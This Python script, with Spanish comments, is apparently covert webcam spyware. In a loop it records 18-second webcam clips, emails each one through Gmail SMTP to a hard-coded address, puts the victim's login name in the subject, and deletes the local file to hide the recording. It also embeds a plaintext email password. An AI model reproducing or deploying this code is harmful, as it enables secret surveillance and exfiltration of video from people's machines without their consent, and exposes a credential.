import cv2
import time
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText
import ctypes

def abrir_webcam():
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("No se pudo abrir la webcam")
        return

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_filename = 'output.avi'
    out = cv2.VideoWriter(output_filename, fourcc, 20.0, (640, 480))

    start_time = time.time()

    while True:
        ret, frame = cap.read()

        if not ret:
            print("No se pudo recibir el frame (stream end?). Saliendo ...")
            break

        out.write(frame)

        elapsed_time = time.time() - start_time
        if elapsed_time > 18:
            break

    cap.release()
    out.release()

    return output_filename

def enviar_video(video_path):
    msg = MIMEMultipart()
    password = "qnzmluqyyagcnmxf"
    msg['From'] = "vladimirdontlikespam@gmail.com"
    msg['To'] = "vladimirdontlikespam@gmail.com"

    nombre_usuario = os.getlogin()
    msg['Subject'] = f"WEBCAM de {nombre_usuario}"

    msg.attach(MIMEText("Adjunto se encuentra el video capturado desde la webcam."))

    try:
        with open(video_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(video_path)}"')
            msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
        print("Correo enviado exitosamente con el video adjunto")

        # Eliminar el archivo de video después de enviarlo
        eliminar_archivo(video_path)

    except Exception as e:
        print(f"Fallo al enviar el correo: {e}")

def eliminar_archivo(ruta):
    try:
        os.remove(ruta)
        print(f"Archivo {ruta} eliminado exitosamente.")
    except Exception as e:
        print(f"Error al eliminar el archivo: {e}")

if __name__ == "__main__":
    while True:
        # Captura el video de la webcam (18 segundos)
        video_capturado = abrir_webcam()

        # Enviar el video por correo si se ha capturado correctamente
        if video_capturado:
            enviar_video(video_capturado)

        # Esperar 2 minutos antes de capturar el siguiente video
        time.sleep(120)  # 120 segundos